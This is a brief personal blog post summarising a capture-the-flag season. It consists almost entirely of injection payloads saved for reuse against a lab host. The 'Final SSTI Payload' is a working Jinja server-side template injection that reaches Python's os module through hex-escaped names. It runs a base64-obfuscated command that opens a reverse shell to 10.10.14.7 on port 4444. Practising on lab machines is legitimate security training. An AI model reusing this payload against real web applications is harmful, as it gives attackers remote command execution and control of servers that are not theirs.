---
title: "Season Summary"
date: 2024-08-21
---


Overall I learned a lot and these are some of my favorite snippets that i definitely will be keeping. SPOILERS REMOVED don't worry.

## SSTI With Jinja

Context: Obtaining Foothold using Server Side Template Injection with Jinja

I can see that I can by pass with this payload

```
invoice_id=&form_type=scannable_invoice&qr_link=https%3A%2F%2Fbruhaps.htb%2Fstatic%2Fqr_code%2Fqr_code_5868828307.png" {{'><script>;</script>'|safe}}
```

### Final SSTI Payload
```
invoice_id=&form_type=scannable_invoice&qr_link={% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDQ7IC9iaW4vc2ggPCYxOTYgPiYxOTYgMj4mMTk2 | base64 -d | bash")["read"]() %} a {% endwith %}
```

